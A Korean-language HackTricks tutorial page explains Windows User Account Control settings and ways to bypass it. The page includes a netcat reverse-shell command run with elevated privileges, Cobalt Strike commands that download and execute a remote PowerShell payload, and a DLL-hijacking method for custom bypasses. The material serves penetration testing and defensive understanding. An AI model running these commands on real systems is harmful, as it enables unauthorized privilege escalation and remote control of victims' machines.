# UAC - 사용자 계정 제어

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)를 사용하여 세계에서 가장 **고급 커뮤니티 도구**를 활용한 **워크플로우를 쉽게 구축하고 자동화**하세요.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[사용자 계정 제어 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)는 **승격된 활동에 대한 동의 프롬프트**를 활성화하는 기능입니다. 응용 프로그램은 서로 다른 `무결성` 수준을 가지며, **높은 수준**의 프로그램은 **시스템을 잠재적으로 손상시킬 수 있는 작업**을 수행할 수 있습니다. UAC가 활성화되면 응용 프로그램과 작업은 항상 관리자가 시스템에 대한 관리자 수준 액세스를 명시적으로 허용하지 않는 한 관리자가 아닌 계정의 보안 컨텍스트에서 실행됩니다. 이는 관리자가 의도하지 않은 변경으로부터 보호하는 편의 기능이지만 보안 경계로 간주되지 않습니다.

무결성 수준에 대한 자세한 정보는 다음을 참조하세요:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

UAC가 적용되면 관리자 사용자에게 2개의 토큰이 제공됩니다. 하나는 일반 사용자 수준으로 일반 작업을 수행하기 위한 것이고, 다른 하나는 관리자 권한을 가지고 있습니다.

이 [페이지](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)에서는 UAC가 어떻게 작동하는지에 대해 자세히 설명하며, 로그온 프로세스, 사용자 경험 및 UAC 아키텍처를 포함합니다. 관리자는 로컬 수준에서 (secpol.msc를 사용하여) UAC가 조직에 특정하게 작동하도록 보안 정책을 구성하거나 그룹 정책 개체 (GPO)를 통해 구성하고 배포할 수 있습니다. 다양한 설정에 대해 자세히 알아보려면 [여기](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)를 참조하세요. UAC에 대해 설정할 수 있는 10개의 그룹 정책 설정에 대한 추가 세부 정보는 다음 표에서 제공됩니다:

| 그룹 정책 설정                                                                                                                                                                                                                                                                                                                                                                 | 레지스트리 키                | 기본 설정                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [내장 관리자 계정에 대한 사용자 계정 제어: 관리자 승인 모드](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | 비활성화                                                     |
| [UIAccess 응용 프로그램이 안전한 데스크톱을 사용하지 않고 승격을 위해 프롬프트할 수 있도록 허용](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | 비활성화                                                     |
| [관리자 승인 모드에서 관리자에 대한 승격 프롬프트 동작](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Windows 이외의 이진 파일에 대해 동의 프롬프트 표시 |
| [표준 사용자에 대한 승격 프롬프트 동작](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | 안전한 데스크톱에서 자격 증명을 요청하는 프롬프트 표시 |
| [응용 프로그램 설치 감지 및 승격 프롬프트 표시](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | 활성화 (홈의 기본 설정) 비활성화 (기업의 기본 설정) |
| [검증된 서명이 있는 실행 파일만 승격](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | 비활성화                                                     |
| [안전한 위치에 설치된 UIAccess 응용 프로그램만 승격](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | 활성화                                                      |
| [모든 관리자를 관리자 승인 모드에서 실행](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | 활성화                                                      |
| [승격 프롬프트를 위해 안전한 데스크톱으로 전환](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | 활성화                                                      |
| [사용자별 위치에 대한 파일 및 레지스트리 쓰기 실패를 가상화](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | 활성화                                                      |
### UAC 우회 이론

일부 프로그램은 사용자가 관리자 그룹에 속해 있으면 **자동으로 자동 상승**됩니다. 이러한 이진 파일에는 _**Manifests**_ 내부에 _**autoElevate**_ 옵션이 _**True**_ 값으로 포함되어 있어야 합니다. 또한 이진 파일은 Microsoft에 의해 **서명**되어야 합니다.

그런 다음, **UAC**를 우회하기 위해 (중간 무결성 수준에서 높은 수준으로 상승) 일부 공격자는 이러한 종류의 이진 파일을 사용하여 **임의의 코드를 실행**합니다. 이는 **높은 수준 무결성 프로세스**에서 실행되기 때문입니다.

Sysinternals의 _**sigcheck.exe**_ 도구를 사용하여 이진 파일의 _**Manifest**_를 확인할 수 있습니다. 또한 Sysinternals의 _Process Explorer_ 또는 _Process Monitor_를 사용하여 프로세스의 **무결성 수준**을 확인할 수 있습니다.

### UAC 확인

UAC가 활성화되어 있는지 확인하려면 다음을 수행하세요:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
만약 **`1`**이라면 UAC가 **활성화**되어 있습니다. **`0`**이거나 **존재하지 않는다면**, UAC는 **비활성화**되어 있습니다.

그런 다음, **어떤 레벨**이 구성되어 있는지 확인하세요:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* 만약 **`0`**이면, UAC는 프롬프트하지 않습니다 (**비활성화**와 같음)
* 만약 **`1`**이면, 관리자는 바이너리를 높은 권한으로 실행하기 위해 **사용자 이름과 비밀번호를 요청**받습니다 (보안 데스크톱에서)
* 만약 **`2`**이면 (**항상 알림**) UAC는 관리자가 높은 권한으로 무언가를 실행하려고 할 때마다 항상 확인을 요청합니다 (보안 데스크톱에서)
* 만약 **`3`**이면 `1`과 같지만 보안 데스크톱에서는 필요하지 않습니다
* 만약 **`4`**이면 `2`와 같지만 보안 데스크톱에서는 필요하지 않습니다
* 만약 **`5`**이면(**기본값**) 관리자에게 비 Windows 바이너리를 높은 권한으로 실행할 것인지 확인을 요청합니다

그런 다음 **`LocalAccountTokenFilterPolicy`** 값에 주목해야 합니다.\
값이 **`0`**이면, **RID 500** 사용자 (**기본 제공 관리자**)만 UAC 없이 관리 작업을 수행할 수 있으며, 값이 `1`이면 **"Administrators"** 그룹 내의 모든 계정이 수행할 수 있습니다.

마지막으로 **`FilterAdministratorToken`** 키의 값을 확인해야 합니다.\
**`0`**(기본값)이면 **기본 제공 관리자 계정**은 원격 관리 작업을 수행할 수 있고, **`1`**이면 기본 제공 계정 관리자는 `LocalAccountTokenFilterPolicy`가 `1`로 설정되어 있지 않는 한 원격 관리 작업을 수행할 수 없습니다.

#### 요약

* `EnableLUA=0`이거나 **존재하지 않으면**, **누구에게도 UAC가 없음**
* `EnableLua=1`이고 **`LocalAccountTokenFilterPolicy=1`이면, 누구에게도 UAC가 없음**
* `EnableLua=1`이고 **`LocalAccountTokenFilterPolicy=0`이고 `FilterAdministratorToken=0`이면, RID 500 (기본 제공 관리자)에게는 UAC가 없음**
* `EnableLua=1`이고 **`LocalAccountTokenFilterPolicy=0`이고 `FilterAdministratorToken=1`이면, 모든 사람에게 UAC가 있음**

이 모든 정보는 **metasploit** 모듈인 `post/windows/gather/win_privs`를 사용하여 수집할 수 있습니다.

또한 사용자의 그룹을 확인하고 무결성 수준을 얻을 수도 있습니다:
```
net user %username%
whoami /groups | findstr Level
```
## UAC 우회

{% hint style="info" %}
피해자에게 그래픽 액세스 권한이 있다면 UAC 우회는 간단합니다. UAC 프롬프트가 나타날 때 "예"를 클릭하기만 하면 됩니다.
{% endhint %}

UAC 우회는 다음 상황에서 필요합니다: **UAC가 활성화되어 있으며, 프로세스가 중간 무결성 컨텍스트에서 실행되고 사용자가 관리자 그룹에 속한 경우**입니다.

UAC가 가장 높은 보안 수준(항상)에 있는 경우 다른 수준(기본값)에 있는 경우보다 UAC 우회가 **훨씬 어렵습니다**.

### UAC 비활성화

UAC가 이미 비활성화된 경우 (`ConsentPromptBehaviorAdmin`이 **`0`**) 다음과 같이 **관리자 권한(높은 무결성 수준)으로 역쉘을 실행**할 수 있습니다:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### 토큰 복제를 이용한 UAC 우회

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### 매우 기본적인 UAC "우회" (전체 파일 시스템 액세스)

관리자 그룹에 속한 사용자로 쉘을 보유하고 있다면 SMB(파일 시스템)을 통해 C$ 공유를 마운트할 수 있으며, 새로운 디스크로 로컬에 접근할 수 있습니다. 이를 통해 파일 시스템 내의 모든 것에 액세스할 수 있습니다(심지어 관리자의 홈 폴더까지).

{% hint style="warning" %}
**이 트릭은 더 이상 작동하지 않는 것 같습니다.**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC 우회 - 코발트 스트라이크

코발트 스트라이크 기술은 UAC가 최대 보안 수준으로 설정되어 있지 않은 경우에만 작동합니다.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire**와 **Metasploit**에는 **UAC**를 우회하기 위한 여러 모듈도 있습니다.

### KRBUACBypass

[https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)에서 문서와 도구를 찾을 수 있습니다.

### UAC 우회 exploits

[**UACME**](https://github.com/hfiref0x/UACME)는 여러 UAC 우회 exploits의 **컴파일**입니다. UACME를 사용하려면 visual studio 또는 msbuild를 사용하여 UACME를 **컴파일해야 합니다**. 컴파일을 하면 여러 실행 파일이 생성됩니다 (예: `Source\Akagi\outout\x64\Debug\Akagi.exe`와 같은). **어떤 것이 필요한지 알아야 합니다**.\
일부 우회 기법은 **사용자에게 알림을 보내는 다른 프로그램**을 **활성화**할 수 있으므로 **주의**해야 합니다.

UACME에는 각 기법이 작동하기 시작한 **빌드 버전**이 있습니다. 해당 버전에 영향을 미치는 기법을 검색할 수 있습니다.
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
또한, [이](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) 페이지를 사용하여 Windows 릴리스 `1607`을 빌드 버전에서 얻을 수 있습니다.

#### 추가 UAC 우회

여기에서 사용하는 모든 기술은 희생자와의 완전한 대화형 셸이 필요합니다 (일반적인 nc.exe 셸은 충분하지 않음).

**meterpreter** 세션을 사용할 수 있습니다. **세션** 값이 **1**인 **프로세스**로 이동하세요:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_가 작동해야 함)

### GUI를 사용한 UAC 우회

**GUI에 액세스할 수 있다면 UAC 프롬프트를 수락**하기만 하면 우회할 필요가 없습니다. 따라서 GUI에 액세스하면 UAC를 우회할 수 있습니다.

또한, 누군가가 사용한 GUI 세션 (잠재적으로 RDP를 통해)에는 **관리자로 실행되는 일부 도구**가 있습니다. 이 도구를 사용하여 UAC에 다시 프롬프트되지 않고 직접 **cmd**를 **관리자 권한으로 실행**할 수 있습니다. 예를 들어 [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)와 같은 도구가 있습니다. 이 방법은 조금 더 **은밀**할 수 있습니다.

### 소음이 발생하는 무차별 대입 UAC 우회

소음이 발생하는 것에 신경 쓰지 않는다면 항상 [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin)와 같은 것을 실행하여 사용자가 수락할 때까지 권한 상승을 요청할 수 있습니다.

### 사용자 고유의 우회 - 기본 UAC 우회 방법론

**UACME**를 살펴보면 대부분의 UAC 우회가 Dll Hijacking 취약점을 악용한다는 것을 알 수 있습니다 (주로 악성 dll을 _C:\Windows\System32_에 작성). [Dll Hijacking 취약점을 찾는 방법에 대해 알아보려면 이 문서를 읽으세요](../windows-local-privilege-escalation/dll-hijacking.md).

1. **자동 상승**하는 이진 파일을 찾으세요 (실행될 때 높은 무결성 수준에서 실행되는지 확인).
2. procmon을 사용하여 **"NAME NOT FOUND"** 이벤트를 찾아 **DLL Hijacking**에 취약할 수 있습니다.
3. 쓰기 권한이 없는 **보호된 경로** (예: C:\Windows\System32)에 DLL을 **작성**해야 할 수도 있습니다. 다음을 사용하여 이를 우회할 수 있습니다:
1. **wusa.exe**: Windows 7, 8 및 8.1. 이 도구는 높은 무결성 수준에서 실행되기 때문에 보호된 경로 내의 CAB 파일의 내용을 추출할 수 있습니다.
2. **IFileOperation**: Windows 10.
4. 보호된 경로 내에 DLL을 복사하고 취약하고 자동 상승하는 이진 파일을 실행하는 스크립트를 준비하세요.

### 다른 UAC 우회 기술

자동 상승하는 이진 파일이 **레지스트리**에서 **이진 파일** 또는 **명령**의 **이름/경로**를 **읽으려고 시도**하는지 관찰하는 것입니다 (이는 이진 파일이 **HKCU** 내에서 이 정보를 검색하는 경우에 더 흥미로울 수 있음).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)를 사용하여 세계에서 가장 **고급**인 커뮤니티 도구를 활용한 **워크플로우를 쉽게 구축**하고 **자동화**할 수 있습니다.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로에서 영웅까지 AWS 해킹을 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **자신의 해킹 기법을 공유**하세요.

</details>
